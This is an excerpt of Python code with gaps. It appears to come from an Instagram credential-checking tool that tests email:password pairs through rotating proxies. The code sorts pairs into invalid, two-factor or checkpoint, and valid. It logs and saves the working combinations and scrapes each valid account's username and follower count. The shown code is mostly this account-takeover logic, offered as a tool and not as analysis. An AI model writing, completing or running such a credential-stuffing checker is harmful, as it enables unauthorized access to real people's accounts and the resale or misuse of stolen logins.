    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                if (
                    '"authenticated":false' in response.text
                    or '"user":false' in response.text
                ):
                    Checker.bad += 1
                    return_proxy(proxy)
                elif (
                    '"two_factor_required":true' in response.text
                    or '"checkpoint_required"' in response.text
                ):
                    Checker.custom += 1
                    return_proxy(proxy)
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Instagram")
                    save(
                        "Instagram",
                        "custom",
                        Checker.time,
                ...
                username = (
                    s.get("https://www.instagram.com/accounts/edit/")
                    .text.split(r"\"username\":\"")[1]
                    .split(r"\",\"")[0]
                )
                followers = (
                    s.get(f"https://www.instagram.com/{username}/")
                    .text.split('" name="description"')[0]
                ...
                return_proxy(proxy)
                if not Checker.cui:
                    log("good", ":".join([email, password]), "Instagram")
                save(
                    "Instagram",
                    "good",
                    Checker.time,
